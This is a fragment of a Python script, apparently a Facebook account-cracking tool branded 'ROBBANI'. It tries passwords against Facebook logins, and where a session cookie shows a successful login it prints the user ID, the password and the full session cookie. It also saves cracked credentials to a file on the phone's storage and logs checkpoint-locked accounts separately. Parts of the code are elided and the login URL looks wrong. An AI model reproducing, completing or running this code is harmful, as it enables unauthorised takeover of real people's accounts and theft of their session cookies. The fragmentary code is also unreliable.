...
logo = ("""
 ...
 \
   ___  ____  ___  ___  ___   _  ______
  / _ \/ __ \/ _ )/ _ )/ _ | / |/ /  _/
 / , _/ /_/ / _  / _  / __ |/    // /  
/_/|_|\____/____/____/_/ |_/_/|_/___/  
...
def fuck():
    ...
    print(' [✓] OK Ids saved as Robbani-OK.txt')
    print(' [✓] CP Id Save as Robbani-CP.txt')
    print('-------------------')
def hasan(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            lo = session.post('https://www.facebook.com/robbane.gam.1',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"[ROBBANI-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/Robbani-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[ROBBANI-CP] {cid}|{ps}")
